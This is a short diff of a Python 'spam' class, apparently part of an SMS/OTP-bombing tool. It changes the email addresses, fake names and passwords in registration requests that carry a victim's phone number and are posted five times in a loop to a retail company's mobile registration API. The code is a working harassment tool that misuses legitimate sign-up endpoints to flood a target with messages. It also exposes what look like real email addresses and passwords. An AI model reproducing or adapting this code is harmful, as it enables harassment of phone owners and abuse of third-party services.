@@ -314,7 +314,7 @@ class spam:
 'x-company-name': 'odi',
 'x-frontend-type': 'mobile',
 }
-     dataurl = {"phone":"0"+nom,"email":"Profesoracc02@gmail.com","action":"register","password":""}
+     dataurl = {"phone":"0"+nom,"email":"abilseno11@gmail.com","action":"register","password":""}
      dataurljson = json.dumps(dataurl)
      dataurl2 = {"phone":"0"+nom,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0}                                    
      dataurl2json = json.dumps(dataurl2)
@@ -511,7 +511,7 @@ class spam:
 'accept-encoding':'gzip, deflate, br',
 'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
      }
-     dat = {"emailAddress":"Profesoracc02@gmail.com","firstName":"Prof","lastName":"Acc","mobileNumber":"0"+nom,"mccCardNumber":"","password":"zxcvbnmlkj","referralCode":"","dateOfBirth":"03-01-1999","gender":"Male","registrationType":"N"}
+     dat = {"emailAddress":"abilseno11@gmail.com","firstName":"Bapak","lastName":"Gile","mobileNumber":"0"+nom,"mccCardNumber":"","password":"savagetro123","referralCode":"","dateOfBirth":"03-01-1999","gender":"Male","registrationType":"N"}
      datj = json.dumps(dat)
      for x in range(5):
        yu = r.post("https://thor.matahari.com/MatahariMobileAPI/register",headers=hd,data=datj)
